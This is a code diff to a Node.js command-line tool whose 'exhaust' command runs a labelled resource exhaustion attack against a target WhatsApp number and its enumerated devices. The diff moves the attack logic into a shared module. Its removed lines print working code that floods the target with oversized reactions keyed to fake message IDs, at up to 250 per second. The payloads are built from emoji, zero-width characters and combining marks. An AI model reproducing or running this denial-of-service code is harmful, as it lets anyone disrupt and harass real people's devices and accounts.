@@ -2,29 +2,16 @@ import chalk from 'chalk';
 import ora from 'ora';
 import fs from 'fs';
 import path from 'path';
-import { createConnectedSocket } from '../lib/client.js';
+import { createConnectedSocket, markShuttingDown } from '../lib/client.js';
 import { checkAuth, sleep, resolveTargetJid } from '../lib/utils.js';
 import { discoverDevices } from '../lib/probe.js';
-
-// Aggression mode configurations
-const MODES = {
-    aggressive: {
-        payloadSize: 1000,
-        rate: 250,          // reactions per second
-        delayMs: 4          // delay between sends
-    },
-    slow: {
-        payloadSize: 500,
-        rate: 10,
-        delayMs: 100
-    }
-};
+import { EXHAUST_MODES, sendOversizedReaction } from '../lib/exhaust.js';
 
 export async function exhaust(number, options) {
     checkAuth();
 
     const mode = options.aggression === 'slow' ? 'slow' : 'aggressive';
-    const config = MODES[mode];
+    const config = EXHAUST_MODES[mode];
     const duration = parseInt(options.duration, 10) || 60;
 
     console.log(chalk.red.bold('\n⚠️  RESOURCE EXHAUSTION ATTACK'));
@@ -37,12 +24,11 @@ export async function exhaust(number, options) {
     console.log(chalk.red('Press Ctrl+C to stop\n'));
 
     try {
-        const connectSpinner = ora('Connecting to WhatsApp...').start();
+        const connectSpinner = ora({ text: 'Connecting to WhatsApp...', discardStdin: false }).start();
         const sock = await createConnectedSocket();
         connectSpinner.succeed('Connected to WhatsApp');
 
-        // Enumerate devices
-        const deviceSpinner = ora('Enumerating target devices...').start();
+        const deviceSpinner = ora({ text: 'Enumerating target devices...', discardStdin: false }).start();
         const resolved = await resolveTargetJid(sock, number);
         const targetJid = resolved.jid;
         const devices = await discoverDevices(sock, targetJid);
@@ -59,6 +45,7 @@ export async function exhaust(number, options) {
         let running = true;
         process.on('SIGINT', () => {
             running = false;
+            markShuttingDown();
             console.log(chalk.yellow('\n\nStopping attack...'));
         });
 
@@ -120,46 +107,11 @@ export async function exhaust(number, options) {
             console.log(chalk.cyan(`\nLog saved to: ${logPath}`));
         }
 
+        markShuttingDown();
         sock.end();
         process.exit(0);
     } catch (error) {
         console.error(chalk.red('Error:'), error);
         process.exit(1);
     }
-}
-
-async function sendOversizedReaction(sock, targetJid, payloadSize) {
-    const fakeId = 'DOS_' + Date.now() + '_' + Math.random().toString(36).substring(7);
-    const fakeKey = {
-        remoteJid: targetJid,
-        fromMe: true,
-        id: fakeId
-    };
-
-    const payload = generatePayload(payloadSize);
-
-    await Promise.race([
-        sock.sendMessage(targetJid, {
-            react: {
-                text: payload,
-                key: fakeKey
-            }
-        }),
-        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
-    ]);
-}
-
-function generatePayload(size) {
-    const patterns = [
-        () => String.fromCharCode(0x1F600 + (Math.random() * 80 | 0)),
-        () => '\u200B\u200C\u200D\uFEFF',
-        () => String.fromCharCode(0x0300 + (Math.random() * 112 | 0)),
-    ];
-
-    let payload = '';
-    while (payload.length < size) {
-        const pattern = patterns[Math.floor(Math.random() * patterns.length)];
-        payload += pattern();
-    }
-    return payload.substring(0, size);
 }
